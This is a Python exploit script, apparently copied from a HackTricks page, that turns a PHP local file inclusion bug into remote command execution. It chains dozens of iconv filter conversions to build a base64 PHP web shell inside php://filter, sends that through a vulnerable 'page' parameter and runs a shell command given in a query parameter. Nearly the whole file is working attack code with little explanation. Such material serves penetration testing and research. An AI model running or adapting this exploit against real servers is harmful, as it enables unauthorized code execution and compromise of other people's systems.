#from https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
import requests

url = "http://localhost/index.php"
file_to_use = "php://temp"  #possible alternative files: /etc/passwd    
command = "id"       

#<?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

conversions = {
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    '1': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.OSF1002035D.EUC-KR|convert.iconv.MAC-CYRILLIC.T.61-8BIT|convert.iconv.1046.CSIBM864|convert.iconv.OSF1002035E.UCS-4BE|convert.iconv.EBCDIC-INT1.IBM943',
    '2': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO6937.OSF1002011C|convert.iconv.CP1146.EUCJP-OPEN|convert.iconv.IBM1157.UTF8',
    '3': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO8859-7.CSISOLATIN3|convert.iconv.ISO-8859-9.CP905|convert.iconv.IBM1112.CSPC858MULTILINGUAL|convert.iconv.EBCDIC-CP-NL.ISO-10646',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2',
    '5': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.RUSCII.IBM275|convert.iconv.CSEBCDICFR.CP857|convert.iconv.EBCDIC-CP-WT.ISO88591',
    '6': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-37.MACUK|convert.iconv.CSIBM297.ISO-IR-203',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'a': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSIBM9066.CP1371|convert.iconv.KOI8-RU.OSF00010101|convert.iconv.EBCDIC-CP-FR.ISO-IR-156',
    'b': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1399.UCS4',
    'c': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.8859_9.OSF100201F4|convert.iconv.IBM1112.CP1004|convert.iconv.OSF00010007.CP285|convert.iconv.IBM-1141.OSF10020402',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'e': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO27LATINGREEK1.SHIFT_JISX0213|convert.iconv.IBM1164.UCS-4',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    'g': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022CN.CP855|convert.iconv.CSISO49INIS.IBM1142',
    'h': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.THAI8.OSF100201B5|convert.iconv.NS_4551-1.CP1160|convert.iconv.CP275.IBM297',
    'i': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.IBM943|convert.iconv.CUBA.CSIBM1140',
    'j': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO27LATINGREEK1.UCS-4BE|convert.iconv.IBM857.OSF1002011C',
    'k': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO88594.CP912|convert.iconv.ISO-IR-121.CP1122|convert.iconv.IBM420.UTF-32LE|convert.iconv.OSF100201B5.IBM-1399',
    'l': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO90.MACIS|convert.iconv.CSIBM865.10646-1:1993|convert.iconv.ISO_69372.CSEBCDICATDEA',
    'm': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.CSSHIFTJIS|convert.iconv.NO2.CSIBM1399',
    'n': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.IBM862|convert.iconv.CP860.IBM-1399',
    'o': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO8859-6.CP861|convert.iconv.904.UTF-16|convert.iconv.IBM-1122.IBM1390',
    'p': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1125.IBM1146|convert.iconv.IBM284.ISO_8859-16|convert.iconv.ISO-IR-143.IBM-933',
    'q': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.NC_NC00-10:81.CSIBM863|convert.iconv.CP297.UTF16BE',
    'r': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-86.ISO_8859-4:1988|convert.iconv.TURKISH8.CP1149',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    't': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.WINDOWS-1251.CP1364|convert.iconv.IBM880.IBM-1146|convert.iconv.IBM-935.CP037|convert.iconv.IBM500.L3|convert.iconv.CP282.TS-5881',
    'u': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO_6937:1992.ISO-IR-121|convert.iconv.ISO_8859-7:1987.ANSI_X3.110|convert.iconv.CSIBM1158.UTF16BE',
    'v': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.HU.ISO_6937:1992|convert.iconv.CSIBM863.IBM284',
    'w': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO_6937-2:1983.857|convert.iconv.8859_3.EBCDIC-CP-FR',
    'x': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1254.ISO-IR-226|convert.iconv.CSMACINTOSH.IBM-1149|convert.iconv.EBCDICESA.UCS4|convert.iconv.1026.UTF-32LE',
    'y': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.EBCDIC-INT1.IBM-1399',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'A': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-111.IBM1130|convert.iconv.L1.ISO-IR-156',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    'E': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.LATIN7.MACINTOSH|convert.iconv.CSN_369103.CSIBM1388',
    'F': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSIBM9448.ISO-IR-103|convert.iconv.ISO-IR-199.T.61|convert.iconv.IEC_P27-1.CP937',
    'G': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO_8859-3:1988.CP1142|convert.iconv.CSIBM16804.CSIBM1388',
    'H': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.EUCJP-OPEN|convert.iconv.CP5347.CP1144',
    'I': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO8859-6.DS2089|convert.iconv.OSF0004000A.CP852|convert.iconv.HPROMAN8.T.618BIT|convert.iconv.862.CSIBM1143',
    'J': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.US.ISO-8859-13|convert.iconv.CP9066.CSIBM285',
    'K': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.IBM1097.UTF-16BE',
    'L': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ECMACYRILLIC.IBM256|convert.iconv.GEORGIAN-ACADEMY.10646-1:1993|convert.iconv.IBM-1122.IBM920',
    'M': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.SE2.ISO885913|convert.iconv.866NAV.ISO2022JP2|convert.iconv.CP857.CP930',
    'N': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.IBM9066.UTF7|convert.iconv.MIK.CSIBM16804',
    'O': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-197.CSIBM275|convert.iconv.IBM1112.UTF-16BE|convert.iconv.ISO_8859-3:1988.CP500',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'Q': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.NO.CP275|convert.iconv.EBCDIC-GREEK.CP936|convert.iconv.CP922.CP1255|convert.iconv.MAC-IS.EBCDIC-CP-IT',
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'S': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1154.UCS4',
    'T': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.IBM1163.CP1388|convert.iconv.OSF10020366.MS-MAC-CYRILLIC|convert.iconv.ISO-IR-25.ISO-IR-85|convert.iconv.GREEK.IBM-1144',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'X': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.OSF10020388.IBM-935|convert.iconv.CP280.WINDOWS-1252|convert.iconv.CP284.IBM256|convert.iconv.CP284.LATIN1',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'Z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO90.CSEBCDICFISE',
    '+': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ANSI_X3.4-1986.CP857|convert.iconv.OSF10020360.ISO885913|convert.iconv.EUCCN.UTF7|convert.iconv.GREEK7-OLD.UCS4',
    '=': ''
}


# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

r = requests.get(url, params={
    "0": command,
    "action": "include",
    "page": final_payload           #vulnerable parameter: ie http://site.org/nav.php?page=index.html    
})

print(r)
print(r.text)
